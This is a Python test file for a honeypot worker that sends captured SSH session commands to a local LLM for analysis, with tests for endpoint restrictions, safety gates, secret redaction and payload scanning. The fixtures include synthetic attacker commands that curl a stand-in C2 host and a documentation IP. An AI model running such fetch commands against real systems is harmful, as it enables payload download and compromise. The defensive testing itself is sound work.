"""Worker orchestration tests; every fixture is synthetic and non-routable."""

from __future__ import annotations

import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import worker  # noqa: E402
from contracts import SessionAnalysis  # noqa: E402


def config(**changes):
    values = dict(
        enabled=False,
        dry_run=True,
        allow_captured_data=False,
        session_enabled=False,
        payload_enabled=False,
        daily_report_enabled=False,
        es_host="http://elasticsearch:9200",
        ollama_url="http://ollama:11434",
        model="qwen3.5:4b",
        poll_interval=60,
        max_content_chars=12000,
        max_payload_bytes=1 << 20,
        max_events_per_cycle=2000,
        max_jobs_per_cycle=20,
        max_payload_scan_files=5000,
        session_idle_seconds=300,
        daily_report_hour=6,
        context_length=8192,
        output_tokens=512,
        payload_roots=(),
        log_level="INFO",
    )
    values.update(changes)
    return worker.Config(**values)


class EndpointAndGateTests(unittest.TestCase):
    def test_only_local_uncredentialed_endpoints_are_allowed(self):
        credential_url = "http://user" + ":" + "secret" + "@ollama:11434"
        allowed = {
            "http://ollama:11434",
            "http://127.0.0.1:11434",
            "http://10.8.0.2:11434",
            "http://172.20.0.2:9200",
            "http://[fd00::1]:11434",
        }
        rejected = {
            "https://api.openai.com/v1",
            "http://203.0.113.8:11434",
            "http://ollama:11434/api/chat",
            credential_url,
            "http://ollama:11434?next=https://example.com",
            "http://attacker.internal:11434",
        }
        for url in allowed:
            self.assertTrue(worker.endpoint_is_local(url, {"ollama", "elasticsearch"}), url)
        for url in rejected:
            self.assertFalse(worker.endpoint_is_local(url, {"ollama", "elasticsearch"}), url)

    def test_dry_run_is_the_default_and_needs_no_endpoint(self):
        with patch.dict(os.environ, {}, clear=True):
            parsed = worker.Config.from_env()
        self.assertTrue(parsed.dry_run)
        self.assertFalse(parsed.enabled)
        self.assertFalse(parsed.allow_captured_data)

    def test_captured_mode_requires_all_gates(self):
        with patch.dict(
            os.environ,
            {
                "LLM_DRY_RUN": "false",
                "LLM_ENABLED": "true",
                "LLM_SESSION_ENABLED": "true",
            },
            clear=True,
        ):
            with self.assertRaisesRegex(ValueError, "LLM_ALLOW_CAPTURED_DATA"):
                worker.Config.from_env()

    def test_external_model_endpoint_is_refused(self):
        with patch.dict(
            os.environ,
            {
                "LLM_DRY_RUN": "false",
                "LLM_ENABLED": "true",
                "LLM_ALLOW_CAPTURED_DATA": "true",
                "LLM_SESSION_ENABLED": "true",
                "OLLAMA_URL": "https://api.openai.com/v1",
            },
            clear=True,
        ):
            with self.assertRaisesRegex(ValueError, "OLLAMA_URL"):
                worker.Config.from_env()


class SessionAccumulatorTests(unittest.TestCase):
    def event(self, event_id="cowrie.command.input", command="id"):
        return {
            "_index": "honeypot-v2-fixture",
            "_id": "event-1",
            "_source": {
                "@timestamp": "2026-08-01T12:00:00Z",
                "honeypot": {
                    "eventid": event_id,
                    "session": "session-fixture",
                    "src_ip": "203.0.113.9",
                    "input": command,
                },
                "source": {"ip": "203.0.113.9"},
                "process": {"command_line": command},
            },
        }

    def test_duplicate_event_is_idempotent_and_command_is_redacted(self):
        accumulator = worker.SessionAccumulator("session-fixture")
        event = self.event(command="TOKEN=fixture-secret curl http://c2.example.test/x")
        accumulator.add_event(event, 12000)
        accumulator.add_event(event, 12000)
        self.assertEqual(accumulator.command_count, 1)
        self.assertEqual(len(accumulator.event_hashes), 1)
        self.assertNotIn("fixture-secret", accumulator.commands[0])

    def test_close_and_login_state_are_recorded(self):
        accumulator = worker.SessionAccumulator("session-fixture")
        login = self.event(event_id="cowrie.login.success")
        login["_id"] = "login"
        closed = self.event(event_id="cowrie.session.closed")
        closed["_id"] = "closed"
        closed["_source"]["honeypot"]["duration"] = 42.5
        accumulator.add_event(login, 12000)
        accumulator.add_event(closed, 12000)
        self.assertTrue(accumulator.auth_success)
        self.assertTrue(accumulator.closed)
        self.assertEqual(accumulator.duration_seconds, 42.5)


class OllamaContractTests(unittest.TestCase):
    def test_native_request_disables_thinking_and_uses_schema(self):
        fake_response = MagicMock()
        fake_response.is_redirect = False
        fake_response.is_permanent_redirect = False
        fake_response.raise_for_status.return_value = None
        fake_response.json.return_value = {
            "message": {
                "content": json.dumps(
                    {
                        "summary": "Reconnaissance commands were observed.",
                        "intent": "reconnaissance",
                        "mitre_attack": ["T1087"],
                        "iocs": [],
                        "severity": "medium",
                        "confidence": "high",
                    }
                )
            },
            "prompt_eval_count": 100,
            "eval_count": 30,
            "done_reason": "stop",
        }
        fake_session = MagicMock()
        fake_session.post.return_value = fake_response
        with patch.object(worker.requests, "Session", return_value=fake_session):
            client = worker.OllamaClient(config())
            annotation, telemetry = client.analyze("fixture prompt", SessionAnalysis)
        request = fake_session.post.call_args.kwargs
        self.assertFalse(request["allow_redirects"])
        self.assertFalse(request["json"]["think"])
        self.assertEqual(request["json"]["options"]["num_ctx"], 8192)
        self.assertEqual(request["json"]["format"]["additionalProperties"], False)
        self.assertEqual(annotation.intent, "reconnaissance")
        self.assertEqual(telemetry["prompt_tokens"], 100)
        self.assertFalse(fake_session.trust_env)


class PayloadSafetyTests(unittest.TestCase):
    def test_scanner_only_returns_regular_bounded_text(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            text_path = root / ("a" * 64)
            text_path.write_text("curl http://198.51.100.2/fixture\n", encoding="utf-8")
            (root / ("b" * 64)).write_bytes(b"MZ\x00binary")
            outside = root.parent / "outside-fixture"
            outside.write_text("not allowed", encoding="utf-8")
            link = root / ("c" * 64)
            try:
                link.symlink_to(outside)
            except OSError:
                link = None
            parsed = config(payload_roots=(root,), max_payload_bytes=1024)
            found = worker.LLMWorker(parsed).iter_text_payloads()
            self.assertEqual(len(found), 1)
            self.assertEqual(found[0][1], text_path.read_bytes())
            if link is not None:
                self.assertNotEqual(found[0][0], worker.hashlib.sha256(outside.read_bytes()).hexdigest())
            outside.unlink()


class OfflineSelftestTests(unittest.TestCase):
    def test_selftest_and_dry_cycle_use_no_clients(self):
        worker.run_selftest()
        result = worker.LLMWorker(config()).run_once()
        self.assertEqual(result["mode"], "dry-run")
        self.assertTrue(result["selftest"])


if __name__ == "__main__":
    unittest.main()
